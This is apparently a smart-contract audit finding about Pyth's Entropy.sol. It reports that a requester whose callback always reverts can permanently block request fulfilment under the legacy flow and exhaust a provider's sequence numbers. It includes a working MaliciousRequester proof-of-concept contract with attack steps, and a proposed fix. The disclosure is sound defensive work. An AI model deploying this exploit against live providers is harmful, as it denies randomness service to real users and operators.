### Title
Malicious Entropy Requester Can Permanently Block Request Fulfillment via Reverting Callback — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

In the legacy callback flow of `revealWithCallback`, the Entropy contract makes a direct, uncaught external call to the requester's `_entropyCallback`. A malicious requester can deploy a contract whose `_entropyCallback` always reverts, causing every `revealWithCallback` attempt to revert. The request is never cleared, permanently consuming the provider's sequence number and blocking that request slot.

---

### Finding Description

The `revealWithCallback` function in `Entropy.sol` has two execution paths, selected by `req.gasLimit10k`:

**New flow** (`gasLimit10k != 0`): uses `excessivelySafeCall` to catch reverts from the callback, transitioning the request to `CALLBACK_FAILED` state for recovery.

**Old flow** (`gasLimit10k == 0`): triggered when the provider's `defaultGasLimit == 0`. This path calls `clearRequest` first, then makes a **direct, uncaught** call to `IEntropyConsumer(callAddress)._entropyCallback(...)`:

```solidity
// Entropy.sol lines 661–702
} else {
    address callAddress = req.requester;
    ...
    clearRequest(provider, sequenceNumber);   // ← cleared first
    ...
    if (len != 0) {
        IEntropyConsumer(callAddress)._entropyCallback(  // ← direct call, no try/catch
            sequenceNumber,
            provider,
            randomNumber
        );
    }
``` [1](#0-0) 

If `_entropyCallback` reverts, the **entire transaction reverts**, including the `clearRequest`. The request remains active in `CALLBACK_NOT_STARTED` state. Every subsequent `revealWithCallback` attempt also reverts. The request is permanently stuck.

The old flow is activated when `providerInfo.defaultGasLimit == 0` at request time:

```solidity
// requestHelper, lines 268–283
if (providerInfo.defaultGasLimit == 0) {
    req.gasLimit10k = 0;  // ← old flow, no revert protection
} else {
    req.gasLimit10k = roundTo10kGas(...);
}
``` [2](#0-1) 

The provider's `sequenceNumber` is incremented at request time in `requestHelper` and is never decremented:

```solidity
providerInfo.sequenceNumber += 1;
``` [3](#0-2) 

Each stuck request permanently consumes one sequence number from the provider's finite chain (bounded by `endSequenceNumber`).

The request storage uses a fixed 32-slot array plus an overflow mapping:

```solidity
EntropyStructsV2.Request[32] requests;
mapping(bytes32 => EntropyStructsV2.Request) requestsOverflow;
``` [4](#0-3) 

Stuck requests in the array are evicted to the overflow mapping by `allocRequest` when a new request collides on the same short hash key, but they remain permanently active in the overflow mapping and their sequence numbers are never recovered.

---

### Impact Explanation

1. **Permanent request DoS**: Any request made by a malicious contract (with `gasLimit10k == 0`) can never be fulfilled. The provider cannot clear it.
2. **Sequence number exhaustion**: Each stuck request permanently consumes one slot from the provider's hash chain. A provider registers with a finite `chainLength`; once `sequenceNumber >= endSequenceNumber`, the provider is out of randomness and cannot serve any new requests (`OutOfRandomness` revert).
3. **No recovery path**: Unlike the new flow, the old flow has no `CALLBACK_FAILED` state and no recovery mechanism. The request is permanently frozen.

---

### Likelihood Explanation

- Any unprivileged user can call `requestWithCallback` or `requestV2` from a contract that implements `_entropyCallback` as `revert()`.
- The attack applies to any provider whose `defaultGasLimit` is `0` — including providers that have not yet migrated to the new gas-limit flow.
- The attacker pays the provider fee per request, making large-scale exhaustion costly but not impossible, especially on low-fee chains.
- No privileged access, leaked keys, or external oracle manipulation is required.

---

### Recommendation

In the old callback flow (`gasLimit10k == 0`), wrap the `_entropyCallback` call in a `try/catch` or use `excessivelySafeCall` (already imported) to prevent a reverting callback from blocking request clearance:

```solidity
// Replace direct call with:
(bool success, ) = callAddress.excessivelySafeCall(
    gasleft(),
    256,
    abi.encodeWithSelector(
        IEntropyConsumer._entropyCallback.selector,
        sequenceNumber,
        provider,
        randomNumber
    )
);
// emit event regardless of success
```

Alternatively, migrate all providers to `defaultGasLimit != 0` to force the new flow, and deprecate the old path entirely.

---

### Proof of Concept

```solidity
// MaliciousRequester.sol
contract MaliciousRequester is IEntropyConsumer {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) payable {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    function attack() external {
        // Provider must have defaultGasLimit == 0 for old flow
        uint128 fee = entropy.getFee(provider);
        entropy.requestWithCallback{value: fee}(provider, bytes32(uint256(1)));
        // sequence number is now consumed; callback will always revert
    }

    function _entropyCallback(uint64, address, bytes32) external override {
        revert("blocked");  // always revert → revealWithCallback always fails
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}
```

1. Deploy `MaliciousRequester` pointing at a provider with `defaultGasLimit == 0`.
2. Call `attack()` — this creates a request with `gasLimit10k == 0`.
3. Provider calls `revealWithCallback(provider, sequenceNumber, ...)` — transaction reverts due to `_entropyCallback` reverting.
4. Provider retries — same result. Request is permanently stuck. Sequence number is consumed.
5. Repeat to exhaust the provider's sequence number range.

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L231-231)
```text
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-283)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
        } else {
            // This check does two important things:
            // 1. Providers have a minimum fee set for their defaultGasLimit. If users request less gas than that,
            //    they still pay for the full gas limit. So we may as well give them the full limit here.
            // 2. If a provider has a defaultGasLimit != 0, we need to ensure that all requests have a >0 gas limit
            //    so that we opt-in to the new callback failure state flow.
            req.gasLimit10k = roundTo10kGas(
                callbackGasLimit < providerInfo.defaultGasLimit
                    ? providerInfo.defaultGasLimit
                    : callbackGasLimit
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L661-681)
```text
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/EntropyState.sol (L33-34)
```text
        EntropyStructsV2.Request[32] requests;
        mapping(bytes32 => EntropyStructsV2.Request) requestsOverflow;
```
